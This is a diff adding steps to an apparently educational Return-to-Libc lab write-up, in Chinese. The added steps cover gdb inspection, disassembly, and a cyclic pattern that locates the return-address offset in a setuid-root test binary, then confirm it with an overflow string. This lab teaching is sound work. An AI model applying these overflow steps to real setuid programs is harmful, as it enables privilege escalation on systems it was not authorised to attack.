@@ -129,3 +129,30 @@ Return to Libc
     sudo chown root:root retlib
     sudo chmod 4755 retlib
 ![image](https://github.com/user-attachments/assets/6363d2ad-254d-4c8d-961d-6135138c4290)
+
+    gdb -q ./retlib並確認目前的安全機制
+![image](https://github.com/user-attachments/assets/42bf296f-1029-4a80-a3b9-456c3b9f61ac)
+
+    反組譯程式碼
+    disassemble main
+    disassemble bof
+![image](https://github.com/user-attachments/assets/078d312b-665b-42f6-ab18-ac6d1f0da6ce)
+![image](https://github.com/user-attachments/assets/bf42fe1b-d5e0-44e7-bd66-513fe8fb3b07)
+
+    塞值到badfile
+    python -c 'print "A"*100' > badfile
+![image](https://github.com/user-attachments/assets/d8c5d79e-4dcd-452c-b60d-b3e1932f26bf)
+
+    找出ret address位置在第24bit
+    pattern create 100 badfile
+    r
+    pattern search
+![image](https://github.com/user-attachments/assets/9323d151-3d74-4a99-96fc-22ecbfc3d098)
+
+    把24bit塞滿A確認ret address在BBBB的位置
+    python -c 'print "A"*24 + "BBBB" + "C"*8' > badfile
+    r
+![image](https://github.com/user-attachments/assets/f56d03e9-a95f-4291-ba9f-ff2d950b5122)
+![image](https://github.com/user-attachments/assets/2b1c9b3e-ad21-45fc-9c6a-d9660ef713f1)
+
+
